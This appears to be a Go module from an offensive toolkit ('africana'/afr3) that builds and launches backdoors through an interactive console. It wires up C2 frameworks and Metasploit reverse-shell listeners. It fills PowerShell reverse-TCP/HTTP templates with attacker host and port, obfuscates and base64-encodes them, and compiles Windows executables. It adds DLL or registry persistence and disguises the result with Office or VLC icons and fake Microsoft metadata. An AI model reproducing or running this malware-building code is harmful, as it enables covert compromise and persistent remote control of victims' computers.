package exploits

import (
    "os"
    "fmt"
    "log"
    "utils"
    "bufio"
    "bytes"
    "menus"
    "banners"
    "strings"
    "bcolors"
    "io/ioutil"
    "subprocess"
    "unicode/utf16"
    "encoding/base64"
)

var (
    Protocol = "tcp"
    Icon = "vlc"
    Lport = "9999"
    Hport = "3333"
    C2 = "blackjack"
    Malware  = "africana_malware"

    Lhost = LhostIp
    scanner = bufio.NewScanner(os.Stdin)
    LhostIp, _ = utils.GetDefaultIP()
    Input, Rhost, Proxy, Module, Script string
    CertDir, OutPutDir, KeyPath, CertPath, ToolsDir, WordList = utils.DirLocations()
)

var defaultValues = map[string]string{
    "proxy": "",
    "module": "",
    "script": "",
    "icon": "vlc",
    "lport": "9999",
    "hport": "3333",
    "c2": "blackjack",
    "protocol": "tcp",
    "build": "africana_malware",
    "lhost": LhostIp,
    "output": OutPutDir,
}

func MalwarePentest() {
    for {
        fmt.Printf("%s%safr3%s exploit(%s%s%s)%s > %s", bcolors.UNDERL, bcolors.BOLD, bcolors.ENDC, bcolors.RED, "backdoors_pentest.fn", bcolors.ENDC, bcolors.GREEN, bcolors.ENDC)
        scanner.Scan()
        Input = strings.TrimSpace(strings.ToLower(scanner.Text()))
        buildParts := strings.Fields(Input)
        if len(buildParts) == 0 {
            continue
        }

        if executeCommand(Input) {
            continue
        }

        switch buildParts[0] {
        case "e", "q", "exit", "quit":
            os.Exit(0)
        case "0", "b", "back":
            return
        case "set":
            handleSetCommand(buildParts)
        case "unset", "delete":
            handleUnsetCommand(buildParts)
        case "run", "start", "launch", "exploit", "execute":
            executeModule()
        default:
            utils.SystemShell(Input)
        }
    }
}

func executeCommand(cmd string) bool {
    commandMap := map[string]func(){

        "? info":           menus.HelpInfo,
        "help info":        menus.HelpInfo,

        "v":                banners.Version,
        "version":          banners.Version,

        "s":                utils.Sleep,
        "sleep":            utils.Sleep,

        "o":                utils.ListJunks,
        "junks":            utils.ListJunks,
        "outputs":          utils.ListJunks,
        "clear junks":      utils.ClearJunks,
        "clear outputs":    utils.ClearJunks,

        "logs":             subprocess.LogHistory,
        "history":          subprocess.LogHistory,
        "clear logs":       subprocess.ClearHistory,
        "clear history":    subprocess.ClearHistory,

        "? run":            menus.HelpInfoRun,
        "h run":            menus.HelpInfoRun,
        "info run":         menus.HelpInfoRun,
        "help run":         menus.HelpInfoRun,
        "? use":            menus.HelpInfoRun,
        "h use":            menus.HelpInfoRun,
        "info use":         menus.HelpInfoRun,
        "help use":         menus.HelpInfoRun,
        "? exec":           menus.HelpInfoRun,
        "h exec":           menus.HelpInfoRun,
        "info exec":        menus.HelpInfoRun,
        "help exec":        menus.HelpInfoRun,
        "? start":          menus.HelpInfoRun,
        "h start":          menus.HelpInfoRun,
        "info start":       menus.HelpInfoRun,
        "help start":       menus.HelpInfoRun,
        "? launch":         menus.HelpInfoRun,
        "h launch":         menus.HelpInfoRun,
        "info launch":      menus.HelpInfoRun,
        "help launch":      menus.HelpInfoRun,
        "? exploit":        menus.HelpInfoRun,
        "h exploit":        menus.HelpInfoRun,
        "info exploit":     menus.HelpInfoRun,
        "help exploit":     menus.HelpInfoRun,
        "? execute":        menus.HelpInfoRun,
        "h execute":        menus.HelpInfoRun,
        "info execute":     menus.HelpInfoRun,
        "help execute":     menus.HelpInfoRun,

        "set":              menus.HelpInfoSet,
        "h set":            menus.HelpInfoSet,
        "info set":         menus.HelpInfoSet,
        "help set":         menus.HelpInfoSet,

        "tips":             menus.HelpInfoTips,
        "h tips":           menus.HelpInfoTips,
        "? tips":           menus.HelpInfoTips,
        "info tips":        menus.HelpInfoTips,
        "help tips":        menus.HelpInfoTips,

        "show":             menus.HelpInfoShow,
        "? show":           menus.HelpInfoShow,
        "h show":           menus.HelpInfoShow,
        "info show":        menus.HelpInfoShow,
        "help show":        menus.HelpInfoShow,

        "info list":        menus.HelpInfoList,
        "help list":        menus.HelpInfoList,
        "use list":         menus.HelpInfoList,
        "list":             menus.HelpInfoList,

        "? options":        menus.HelpInfOptions,
        "info options":     menus.HelpInfOptions,
        "help options":     menus.HelpInfOptions,

        "banner":           banners.RandomBanners,
        "g":                utils.BrowseTutarilas,
        "t":                utils.BrowseTutarilas,
        "guide":            utils.BrowseTutarilas,
        "tutarial":         utils.BrowseTutarilas,
        "h":                menus.HelpInfoMenuZero,
        "?":                menus.HelpInfoMenuZero,
        "00":               menus.HelpInfoMenuZero,
        "help":             menus.HelpInfoMenuZero,
        "f":                menus.HelpInfoFeatures,
        "use f":            menus.HelpInfoFeatures,
        "features":         menus.HelpInfoFeatures,
        "use features":     menus.HelpInfoFeatures,

        //Chameleons//
        "info":             menus.HelpInfoExploits,

        "m":                menus.MenuFour,
        "menu":             menus.MenuFour,

        "option":           menus.HelpInfOptions,
        "options":          menus.HelpInfOptions,
        "show option":      menus.HelpInfOptions,
        "show options":     menus.HelpInfOptions,

        "modules":          menus.ListExploitsModules,
        "show all":         menus.ListExploitsModules,
        "list all":         menus.ListExploitsModules,
        "list modules":     menus.ListExploitsModules,
        "show modules":     menus.ListExploitsModules,
    }
    if action, exists := commandMap[cmd]; exists {
        action()
        return true
    }
    return false
}

func handleSetCommand(parts []string) {
    if len(parts) < 3 {
        menus.HelpInfoSet()
        return
    }
    key, value := parts[1], parts[2]
    setValues := map[string]*string{
        "c2": &C2,
        "icon": &Icon,
        "proxy": &Proxy,
        "lhost": &Lhost,
        "lport": &Lport,
        "hport": &Hport,
        "build": &Malware,
        "module": &Module,
        "script": &Script,
        "output": &OutPutDir,
        "protocol": &Protocol,
    }
    if ptr, exists := setValues[key]; exists {
        *ptr = value
        fmt.Printf("%s => %s\n", strings.ToUpper(key), value)
    } else {
        menus.HelpInfoSet()
    }
}

func handleUnsetCommand(parts []string) {
    if len(parts) < 2 {
        menus.HelpInfoSet()
        return
    }
    key := parts[1]
    unsetValues := map[string]*string{
        "c2": &C2,
        "icon": &Icon,
        "proxy": &Proxy,
        "lhost": &Lhost,
        "lport": &Lport,
        "hport": &Hport,
        "build": &Malware,
        "module": &Module,
        "script": &Script,
        "output": &OutPutDir,
        "protocol": &Protocol,
    }
    if ptr, exists := unsetValues[key]; exists {
        *ptr = defaultValues[key] // Reset to default
        fmt.Printf("%s => %s\n", strings.ToUpper(key), *ptr)
    } else {
        menus.HelpInfoSet()
    }
}

func executeModule() {
    if Module == "" {
        fmt.Printf("\n%s[!] %sMODULE not set. Use %s'help' %sfor details.\n", bcolors.RED, bcolors.ENDC, bcolors.DARKGREEN, bcolors.ENDC)
        return
    }
    MalwarePenModules(Module, Lhost, Lport, Hport, Protocol, C2, Malware)
}

func MalwarePenModules(Module string, args ...interface{}) {
    if Proxy != "" {
        fmt.Printf("PROXIES => %s\n", Proxy)
        utils.SetProxy(Proxy)
    }

    commands := map[string]func(){
        "ncat": func() {Ncat(Lport, Protocol)},
        "havoc": func() {Havoc()},
        "ghost": func() {Gh0x0st(Malware, ToolsDir, Script, OutPutDir)},
        "shellz": func() {Shellz()},
        "seashell": func() {SeaShell()},
        "androrat": func() {AndroRat(Lhost, Lport, Malware, ToolsDir, OutPutDir)},
        "listener": func() {ListenerLauncher(C2, Lport, Hport, Protocol)},
        "teardroid": func() {TearDroid(Malware, ToolsDir, OutPutDir)},
        "blackjack": func() {BlackJack(Lhost, Lport, Hport, Protocol, ToolsDir)},
        "meterpeter": func() {MeterPeter()},
        "powerjoker": func() {PowerJoker(Lhost, Lport, ToolsDir)},
        "metasploit": func() {Metasploit(Lhost, Lport, Protocol)},
        "noisemaker" :func() {NoiseMakers(ToolsDir, Lport, Hport, Protocol, Script, Icon, C2)},
        "codebreaker":func() {CodeBreakers(ToolsDir, Lport, Hport, Protocol, Script, Icon , C2)},
    }

    if action, exists := commands[Module]; exists {
        action()
    } else {
        fmt.Printf("\n%s[!] %sMODULE %s is invalid. Use %s'help' %sfor available modules.\n", bcolors.YELLOW, bcolors.ENDC, Module, bcolors.DARKGREEN, bcolors.ENDC)
    }
}


func Havoc() {
    subprocess.Popen(`havoc client & havoc server -d -v`)
}

func Shellz() {
    subprocess.Popen(`cd %s/exploits/windows/c2/shells/; bash shells.sh`, ToolsDir)
}

func SeaShell() {
    subprocess.Popen(`cd %s/exploits/mackos/c2/seashell/; python3 sea_shell.py`, ToolsDir)
}

func MeterPeter() {
    subprocess.Popen(`cd %s/exploits/windows/c2/meterpeter/; pwsh meterpeter.ps1`, ToolsDir)
}

func TearDroid(Malware string, ToolsDir string, OutPutDir string) {
    fmt.Printf("\nBUILD => %s.apk\nOUTPUT => %s\n\n", Malware, OutPutDir)
    subprocess.Popen(`cd %s/exploits/androids/c2/teardroid/; python3 Teardroid.py -b %s`, ToolsDir, Malware)
}

func AndroRat(Lhost string, Lport string, Malware string, ToolsDir string, OutPutDir string) {
    filePath := "/usr/bin/zipalign.bak_africana"
    if _, err := os.Stat(filePath); os.IsNotExist(err) {
        subprocess.Popen(`mv /usr/bin/zipalign /usr/bin/zipalign.bak_africana; apt-get install %s/exploits/androids/c2/androrat/zipalign_8.1.0.deb --allow-downgrades -y`, ToolsDir)
    }
    fmt.Printf("\nLHOST => %s\nLPORT => %s\nBUILD => %s.apk\nOUTPUT => %s\n\n", Lhost, Lport, Malware, OutPutDir)
    subprocess.Popen(fmt.Sprintf("cd %s/exploits/androids/c2/androrat/; python3 androrat.py --build -i %s -p %s -o %s/%s.apk", ToolsDir, Lhost, Lport, OutPutDir, Malware))
    subprocess.Popen(fmt.Sprintf("cd %s/exploits/androids/c2/androrat/; python3 androrat.py --shell -i %s -p %s", ToolsDir, Lhost, Lport))
}

func Chameleon(Malware string, ToolsDir string, Script string, OutPutDir string) {
    if Script == "" {
        fmt.Printf("\n%s[!] %s SCRIPT location not set. Use %s'help' %sfor details.\n", bcolors.RED, bcolors.ENDC, bcolors.DARKGREEN, bcolors.ENDC)
        return
    }
    fmt.Printf("\nBUILD => %s\nSCRIPT => %s\nOUTPUT => %s\n\n", Malware, Script, OutPutDir)
    subprocess.Popen(`cd %s/exploits/windows/obfuscators/chameleon/; python3 chameleon.py -f -s --verbose %s -o %s/%s`, ToolsDir, Script, OutPutDir, Malware)

}

func Gh0x0st(Malware string, ToolsDir string, Script string, OutPutDir string) {
    if Script == "" {
        fmt.Printf("\n%s[!] %s SCRIPT location not set. Use %s'help' %sfor details.\n", bcolors.RED, bcolors.ENDC, bcolors.DARKGREEN, bcolors.ENDC)
        return
    }
    fmt.Printf("\nBUILD => %s\nSCRIPT => %s\nOUTPUT => %s\n\n", Malware, Script, OutPutDir)
    subprocess.Popen(`cd %s/exploits/windows/obfuscators/stealth/Resources/PSObfuscation/; pwsh -c "Import-Module ./Invoke-PSObfuscation.ps1; Invoke-PSObfuscation -Path %s -Aliases -Cmdlets -Comments -Pipes -PipelineVariables -ShowChanges -o /%s"`, ToolsDir, Script, OutPutDir, Malware)
}

func PowerJoker(Lhost string, Lport string, ToolsDir string) {
    fmt.Printf("\nLHOST => %s\nLPORT => %s\n\n", Lhost, Lport)
    subprocess.Popen(`cd %s/exploits/windows/c2/joker/; python3 joker.py -l %s -p %s`, ToolsDir, Lhost, Lport)
}

func BlackJack(Lhost string, Lport string, Hport string, Protocol string, ToolsDir string) {
    switch strings.ToLower(Protocol) {
    case "tcp":
        fmt.Printf("\nLHOST => %s\nLPORT => %s\nPROTOCOL => %s\n\n", Lhost, Lport, Protocol)
        subprocess.Popen("cd %s/exploits/windows/c2/blackjack/; python3 blackjack.py -q -i -n %s\n", ToolsDir, Lport)
    case "https", "http":
        fmt.Printf("\nLHOST => %s\nLPORT => %s\nHPORT => %s\nPROTOCOL => %s\n\n", Lhost, Lport, Hport, Protocol)
        subprocess.Popen("cd %s/exploits/windows/c2/blackjack/; python3 blackjack.py -q -i -c /root/.afr3/certs/africana-cert.pem -k /root/.afr3/certs/africana-key.pem -x %s -n %s", ToolsDir, Lport, Hport)
        fmt.Println()
    default:
        fmt.Println(bcolors.RED + "[!] " + bcolors.ENDC + "Error: Invalid LISTENER type")
    }
}

func Ncat(Lport string, Protocol string) {
    switch strings.ToLower(Protocol) {
    case "tcp":
        fmt.Printf("\nLHOST => %s\nLPORT => %s\nPROTOCOL => %s\n\n", Lhost, Lport, Protocol)
        subprocess.Popen(`rlwrap ncat -lnvp %s`, Lport)
    case "https", "http":
         fmt.Printf("\nLHOST => %s\nLPORT => %s\nHPORT => %s\nPROTOCOL => %s\n\n", Lhost, Lport, Hport, Protocol)
         subprocess.Popen(`rlwrap ncat --ssl --ssl-key %s/africana-key.pem --ssl-cert %s/africana-cert.pem -lnvp %s`, CertDir, CertDir, Lport)
    default:
        fmt.Println(bcolors.RED + "[!] " + bcolors.ENDC + "Error: Invalid LISTENER type")
    }
}

func Metasploit(Lhost string, Lport string, Protocol string) {
    switch strings.ToLower(Protocol) {
    case "tcp":
        fmt.Printf("\nLHOST => %s\nLPORT => %s\nPROTOCOL => %s\n\n", Lhost, Lport, Protocol)
        subprocess.Popen(`msfconsole -x "use multi/handler;set payload windows/powershell_reverse_tcp; set LHOST %s; set LPORT %s; set ExitOnSession false; exploit -j"`, Lhost, Lport)
    case "http", "https":
        fmt.Printf("\nLHOST => %s\nLPORT => %s\nPROTOCOL => %s\n\n", Lhost, Lport, Protocol)
        subprocess.Popen(`msfconsole -x "use multi/handler;set payload windows/powershell_reverse_tcp_ssl; set LHOST %s; set LPORT %s; set ExitOnSession false; exploit -j"`, Lhost, Lport)
    default:
        fmt.Println(bcolors.RED + "[!] " + bcolors.ENDC + "Error: Invalid LISTENER type")
    }
}

func ShikataGanai(ToolsDir string, Lport string, Hport string, Protocol string, Script string, C2 string) {
    fmt.Printf("\nLHOST => %s\nLPORT => %s\nHPORT => %s\nICON => %s\nPROTOCOL => %s\nC2 => %s\n", Lhost, Lport, Hport, Icon, Protocol, C2)
    switch strings.ToLower(Protocol) {
    case "tcp":
        subprocess.Popen(`cp -r %s/exploits/windows/hoaxshells/payload_templates/ncat_exploits/powershell_reverse_tcp.ps1 %s/powershell_reverse_tcp.txt`, ToolsDir, OutPutDir)
        filesToReplacements := map[string]map[string]string{
            "/root/.afr3/output/powershell_reverse_tcp.txt": {
            `*LHOST*`: Lhost,
            `*LPORT*`: Lport,
            },
        }
        fmt.Println()
        utils.Editors(filesToReplacements)
        Script := `/root/.afr3/output/powershell_reverse_tcp.txt`
        OutPutDir := `/root/.afr3/output/powershell_reverse_tcp.ps1`
        subprocess.Popen(`cd %s/exploits/windows/obfuscators/stealth/Resources/PSObfuscation/; pwsh -c "Import-Module ./Invoke-PSObfuscation.ps1; Invoke-PSObfuscation -Path %s -Aliases -Cmdlets -Comments -Pipes -PipelineVariables -ShowChanges -o %s"`,ToolsDir, Script, OutPutDir)

        filePath := "/root/.afr3/output/powershell_reverse_tcp.ps1"
        content, err := ioutil.ReadFile(filePath)
        if err != nil {
            fmt.Printf("Error reading file: %v\n", err)
            return
        }

        utf16Content := utf16.Encode([]rune(string(content)))
        buf := new(bytes.Buffer)
        for _, v := range utf16Content {
            buf.Write([]byte{byte(v), byte(v >> 8)})
        }

        encoded := base64.StdEncoding.EncodeToString(buf.Bytes())
        subprocess.Popen(`cp -r /root/.afr3/africana-base/exploits/windows/hoaxshells/payload_templates/go_exploits/malware_complete.go /root/.afr3/output/malware_complete.go`)
        Replacement := map[string]map[string]string{
            "/root/.afr3/output/malware_complete.go": {
            `africana`: encoded,
            },
        }
        utils.Editors(Replacement)
        fmt.Printf("\n%s[>] %sEncoding payload to base64 ...\n%spowershell -w 1 -enc '%s'\n", bcolors.YELLOW, bcolors.BLUE, bcolors.ENDC, encoded)
        fmt.Printf("\n%s[>] %sConverting base64 payload to executable ...\n%s", bcolors.YELLOW, bcolors.BLUE, bcolors.ENDC)
        subprocess.Popen("GOOS=windows GOARCH=amd64 go build -v -x -o /root/.afr3/output/malware_complete.exe /root/.afr3/output/malware_complete.go")
        fmt.Println()

    case "http", "https":
        subprocess.Popen(`cp -r %s/exploits/windows/hoaxshells/payload_templates/ncat_exploits/powershell_reverse_http.ps1 %s/powershell_reverse_http.txt`, ToolsDir, OutPutDir)
        filesToReplacements := map[string]map[string]string{
            "/root/.afr3/output/powershell_reverse_http.txt": {
            `*LHOST*`: Lhost,
            `*LPORT*`: Lport,
            },
        }
        fmt.Println()
        utils.Editors(filesToReplacements)
        Script := `/root/.afr3/output/powershell_reverse_http.txt`
        OutPutDir := `/root/.afr3/output/powershell_reverse_http.ps1`
        subprocess.Popen(`cd %s/exploits/windows/obfuscators/stealth/Resources/PSObfuscation/; pwsh -c "Import-Module ./Invoke-PSObfuscation.ps1; Invoke-PSObfuscation -Path %s -Aliases -Cmdlets -Comments -Pipes -PipelineVariables -ShowChanges -o /%s"`,ToolsDir, Script, OutPutDir)

        filePath := "/root/.afr3/output/powershell_reverse_http.ps1"
        content, err := ioutil.ReadFile(filePath)
        if err != nil {
            fmt.Printf("Error reading file: %v\n", err)
            return
        }

        utf16Content := utf16.Encode([]rune(string(content)))
        buf := new(bytes.Buffer)
        for _, v := range utf16Content {
            buf.Write([]byte{byte(v), byte(v >> 8)})
        }

        encoded := base64.StdEncoding.EncodeToString(buf.Bytes())
        subprocess.Popen(`cp -r %s/exploits/windows/obfuscators/payload_templates/go_exploits/malware_complete.go %s/malware_complete.go`, ToolsDir, OutPutDir)
        filesToReplace := map[string]map[string]string{
            "/root/.afr3/output/malware_complete.go": {
            `africana`: encoded,
            },
        }
        utils.Editors(filesToReplace)
        fmt.Printf("\n%s[>] %sEncoding payload to base64 ...\n%spowershell -w 1 -enc '%s'\n", bcolors.YELLOW, bcolors.BLUE, bcolors.ENDC, encoded)
        fmt.Printf("\n%s[>] %sConverting base64 payload to executable ...\n%s", bcolors.YELLOW, bcolors.BLUE, bcolors.ENDC)
        subprocess.Popen("GOOS=windows GOARCH=amd64 go build -v -x -o /root/.afr3/output/malware_complete.exe /root/.afr3/output/malware_complete.go")
        fmt.Println()

    default:
        fmt.Println(bcolors.RED + "[!] " + bcolors.ENDC + "LISTENER %s not found. Try help command ...", Protocol)
    }
}

func IconChanger(Icon string) {
    fmt.Printf(bcolors.YELLOW + "\n[>] " + bcolors.ENDC + "Disguising backdoor with %s icon ...\n", Icon)
    switch strings.ToLower(Icon) {
    case "lync":
        subprocess.Popen(`wine /root/.afr3/africana-base/exploits/windows/hoaxshells/payload_templates/rcedits/rcedit-x64.exe /root/.afr3/output/africana_backdoor.exe --set-file-version "10.0.21994.1" --set-product-version "10.0.21994.1" --set-icon /root/.afr3/africana-base/exploits/windows/hoaxshells/payload_templates/icons/lync.ico --set-version-string OriginalFilename "MicrosoftHelpPane.exe" --set-version-string FileDescription "Microsoft Help and Support"`)
    case "excel":
        subprocess.Popen(`wine /root/.afr3/africana-base/exploits/windows/hoaxshells/payload_templates/rcedits/rcedit-x64.exe /root/.afr3/output/africana_backdoor.exe --set-file-version "10.0.21994.1" --set-product-version "10.0.21994.1" --set-icon /root/.afr3/africana-base/exploits/windows/hoaxshells/payload_templates/icons/excel.ico --set-version-string OriginalFilename "MicrosoftHelpPane.exe" --set-version-string FileDescription "Microsoft Help and Support"`)
    case "access":
        subprocess.Popen(`wine /root/.afr3/africana-base/exploits/windows/hoaxshells/payload_templates/rcedits/rcedit-x64.exe /root/.afr3/output/africana_backdoor.exe --set-file-version "10.0.21994.1" --set-product-version "10.0.21994.1" --set-icon /root/.afr3/africana-base/exploits/windows/hoaxshells/payload_templates/icons/access.ico --set-version-string OriginalFilename "MicrosoftHelpPane.exe" --set-version-string FileDescription "Microsoft Help and Support"`)
    case "autorun":
        subprocess.Popen(`wine /root/.afr3/africana-base/exploits/windows/hoaxshells/payload_templates/rcedits/rcedit-x64.exe /root/.afr3/output/africana_backdoor.exe --set-file-version "10.0.21994.1" --set-product-version "10.0.21994.1" --set-icon /root/.afr3/africana-base/exploits/windows/hoaxshells/payload_templates/icons/autorun.ico --set-version-string OriginalFilename "MicrosoftHelpPane.exe" --set-version-string FileDescription "Microsoft Help and Support"`)
    case "pdf":
        subprocess.Popen(`wine /root/.afr3/africana-base/exploits/windows/hoaxshells/payload_templates/rcedits/rcedit-x64.exe /root/.afr3/output/africana_backdoor.exe --set-file-version "10.0.21994.1" --set-product-version "10.0.21994.1" --set-icon /root/.afr3/africana-base/exploits/windows/hoaxshells/payload_templates/icons/pdf.ico --set-version-string OriginalFilename "MicrosoftHelpPane.exe" --set-version-string FileDescription "Microsoft Help and Support"`)
    case "project":
        subprocess.Popen(`wine /root/.afr3/africana-base/exploits/windows/hoaxshells/payload_templates/rcedits/rcedit-x64.exe /root/.afr3/output/africana_backdoor.exe --set-file-version "10.0.21994.1" --set-product-version "10.0.21994.1" --set-icon /root/.afr3/africana-base/exploits/windows/hoaxshells/payload_templates/icons/project.ico --set-version-string OriginalFilename "MicrosoftHelpPane.exe" --set-version-string FileDescription "Microsoft Help and Support"`)
    case "publisher":
        subprocess.Popen(`wine /root/.afr3/africana-base/exploits/windows/hoaxshells/payload_templates/rcedits/rcedit-x64.exe /root/.afr3/output/africana_backdoor.exe --set-file-version "10.0.21994.1" --set-product-version "10.0.21994.1" --set-icon /root/.afr3/africana-base/exploits/windows/hoaxshells/payload_templates/icons/publisher.ico --set-version-string OriginalFilename "MicrosoftHelpPane.exe" --set-version-string FileDescription "Microsoft Help and Support"`)
    case "powerpoint":
        subprocess.Popen(`wine /root/.afr3/africana-base/exploits/windows/hoaxshells/payload_templates/rcedits/rcedit-x64.exe /root/.afr3/output/africana_backdoor.exe --set-file-version "10.0.21994.1" --set-product-version "10.0.21994.1" --set-icon /root/.afr3/africana-base/exploits/windows/hoaxshells/payload_templates/icons/powerpoint.ico --set-version-string OriginalFilename "MicrosoftHelpPane.exe" --set-version-string FileDescription "Microsoft Help and Support"`)
    case "rat":
        subprocess.Popen(`wine /root/.afr3/africana-base/exploits/windows/hoaxshells/payload_templates/rcedits/rcedit-x64.exe /root/.afr3/output/africana_backdoor.exe --set-file-version "10.0.21994.1" --set-product-version "10.0.21994.1" --set-icon /root/.afr3/africana-base/exploits/windows/hoaxshells/payload_templates/icons/rat.ico --set-version-string OriginalFilename "MicrosoftHelpPane.exe" --set-version-string FileDescription "Microsoft Help and Support"`)
    case "vlc":
        subprocess.Popen(`wine /root/.afr3/africana-base/exploits/windows/hoaxshells/payload_templates/rcedits/rcedit-x64.exe /root/.afr3/output/africana_backdoor.exe --set-file-version "10.0.21994.1" --set-product-version "10.0.21994.1" --set-icon /root/.afr3/africana-base/exploits/windows/hoaxshells/payload_templates/icons/vlc.ico --set-version-string OriginalFilename "MicrosoftHelpPane.exe" --set-version-string FileDescription "Microsoft Help and Support"`)
    case "word":
        subprocess.Popen(`wine /root/.afr3/africana-base/exploits/windows/hoaxshells/payload_templates/rcedits/rcedit-x64.exe /root/.afr3/output/africana_backdoor.exe --set-file-version "10.0.21994.1" --set-product-version "10.0.21994.1" --set-icon /root/.afr3/africana-base/exploits/windows/hoaxshells/payload_templates/icons/word.ico --set-version-string OriginalFilename "MicrosoftHelpPane.exe" --set-version-string FileDescription "Microsoft Help and Support"`)
    case "visio":
        subprocess.Popen(`wine /root/.afr3/africana-base/exploits/windows/hoaxshells/payload_templates/rcedits/rcedit-x64.exe /root/.afr3/output/africana_backdoor.exe --set-file-version "10.0.21994.1" --set-product-version "10.0.21994.1" --set-icon /root/.afr3/africana-base/exploits/windows/hoaxshells/payload_templates/icons/visio.ico --set-version-string OriginalFilename "MicrosoftHelpPane.exe" --set-version-string FileDescription "Microsoft Help and Support"`)
    default:
        utils.SystemShell(Input)
    }
}

 //dll persistence mechanisim//
func NoiseMakers(ToolsDir string, Lport string, Hport string, Protocol string, Script string, Icon string, C2 string) {
    ShikataGanai(ToolsDir, Lport, Hport, Protocol, Script, C2)
    dllFilePath := "/root/.afr3/africana-base/exploits/windows/hoaxshells/payload_templates/injected_dlls/Secur32.dll"
    exeFilePath := "/root/.afr3/output/malware_complete.exe"

    dllData, err := ioutil.ReadFile(dllFilePath)
    if err != nil {
        log.Fatalf(bcolors.RED + "[!] " + bcolors.ENDC + "Failed reading binary file: %s", err)
    }

    exeData, err := ioutil.ReadFile(exeFilePath)
    if err != nil {
        log.Fatalf(bcolors.RED + "[!] " + bcolors.ENDC + "Failed reading executable file: %s", err)
    }

    encodedExe := base64.StdEncoding.EncodeToString(exeData)
    encodedDll := base64.StdEncoding.EncodeToString(dllData)

    subprocess.Popen(`cp -r %s/exploits/windows/hoaxshells/payload_templates/go_exploits/malware_runner_dll.go %s/malware_runner_dll.go`, ToolsDir, OutPutDir)
    filesToReplacements := map[string]map[string]string{
        "/root/.afr3/output/malware_runner_dll.go": {
        "africanas": encodedExe,
        `africanax`: encodedDll,
        },
    }
    utils.Editors(filesToReplacements)

    if err := os.Setenv("GOOS", "windows"); err != nil {
        log.Fatalf(bcolors.RED + "[!] " + bcolors.ENDC + "Failed to set GOOS environment variable: %s", err)
    }
    if err := os.Setenv("GOARCH", "amd64"); err != nil {
        log.Fatalf(bcolors.RED + "[!] " + bcolors.ENDC + "Failed to set GOARCH environment variable: %s", err)
    }

    runnerFilePath := "/root/.afr3/output/malware_runner_dll.go"
    endMalwarePath := "/root/.afr3/output/africana_backdoor.exe"

    fmt.Printf(bcolors.YELLOW + "\n[>] " + bcolors.ENDC + "hooking .exe with .dll for persistence ...\n")

    buildCmd := "go build -v -x -o %s %s"

    formattedCmd := fmt.Sprintf(buildCmd, endMalwarePath, runnerFilePath)
    subprocess.Popen(formattedCmd)

    IconChanger(Icon)
    fmt.Printf(bcolors.YELLOW + "\n[>] " + bcolors.ENDC + "Launching %sc2 ...", C2)
    switch strings.ToLower(C2) {
    case "ncat":
        Ncat(Lport, Protocol)
        return
    case "blackjack":
        BlackJack(Lhost, Lport, Hport, Protocol, ToolsDir)
        return
    case "metasploit":
        Metasploit(Lhost, Lport, Protocol)
        return
    default:
        fmt.Println(bcolors.RED + "[!] " + bcolors.ENDC + "LISTENER %s not found. Try help command ...", Protocol)
    }
    log.Printf(bcolors.GREEN + "\n[+] " + bcolors.ENDC + "complete backdoor saved at: " + bcolors.BLUE + "%s", endMalwarePath + bcolors.ENDC)
}

//regestry persistence mechanisim//
func CodeBreakers(ToolsDir string, Lport string, Hport string, Protocol string, Script string, Icon string, C2 string) {
    ShikataGanai(ToolsDir, Lport, Hport, Protocol, Script, C2)

    exeFilePath := "/root/.afr3/output/malware_complete.exe"
    exeData, err := ioutil.ReadFile(exeFilePath)

    if err != nil {
        log.Fatalf(bcolors.RED + "[!] " + bcolors.ENDC + "Failed reading executable file: %s", err)
    }

    encodedExe := base64.StdEncoding.EncodeToString(exeData)

    subprocess.Popen(`cp -r %s/exploits/windows/hoaxshells/payload_templates/go_exploits/malware_runner_reg.go %s/malware_runner_reg.go`, ToolsDir, OutPutDir)
    filesToReplacements := map[string]map[string]string{
        "/root/.afr3/output/malware_runner_reg.go": {
        "africanas": encodedExe,
        },
    }
    utils.Editors(filesToReplacements)

    if err := os.Setenv("GOOS", "windows"); err != nil {
        log.Fatalf(bcolors.RED + "[!] " + bcolors.ENDC + "Failed to set GOOS environment variable: %s", err)
    }
    if err := os.Setenv("GOARCH", "amd64"); err != nil {
        log.Fatalf(bcolors.RED + "[!] " + bcolors.ENDC + "Failed to set GOARCH environment variable: %s", err)
    }

    runnerFilePath := "/root/.afr3/output/malware_runner_reg.go"
    endMalwarePath := "/root/.afr3/output/africana_backdoor.exe"
    fmt.Printf(bcolors.YELLOW + "\n[>] " + bcolors.ENDC + "hooking .exe with .dll for persistence ...\n")
    buildCmd := "go build -v -x -o %s %s"

    formattedCmd := fmt.Sprintf(buildCmd, endMalwarePath, runnerFilePath)
    subprocess.Popen(formattedCmd)
    IconChanger(Icon)
    fmt.Printf(bcolors.YELLOW + "\n[>] " + bcolors.ENDC + "Launching %s c2 ...", C2)
    switch strings.ToLower(C2) {
    case "ncat":
        Ncat(Lport, Protocol)
        return
    case "blackjack":
        BlackJack(Lhost, Lport, Hport, Protocol, ToolsDir)
        return  
    case "metasploit":
        Metasploit(Lhost, Lport, Protocol)
        return
    default:
        fmt.Println(bcolors.RED + "[!] " + bcolors.ENDC + "Error: Invalid LISTENER type")
    }
    log.Printf(bcolors.GREEN + "\n[+] " + bcolors.ENDC + "complete backdoor saved at: " + bcolors.BLUE + "%s", endMalwarePath + bcolors.ENDC)
}

func ListenerLauncher(C2 string, Lport string, Hport string, Protocol string) {
    fmt.Printf(bcolors.YELLOW + "\n[>] " + bcolors.ENDC + "Launching %s c2 ...", C2)
    switch strings.ToLower(C2) {
    case "ncat":
        Ncat(Lport, Protocol)
        return
    case "blackjack":
        BlackJack(Lhost, Lport, Hport, Protocol, ToolsDir)
        return  
    case "metasploit":
        Metasploit(Lhost, Lport, Protocol)
        return
    default:
        fmt.Println(bcolors.RED + "[!] " + bcolors.ENDC + "Error: Invalid LISTENER type")
    }
}
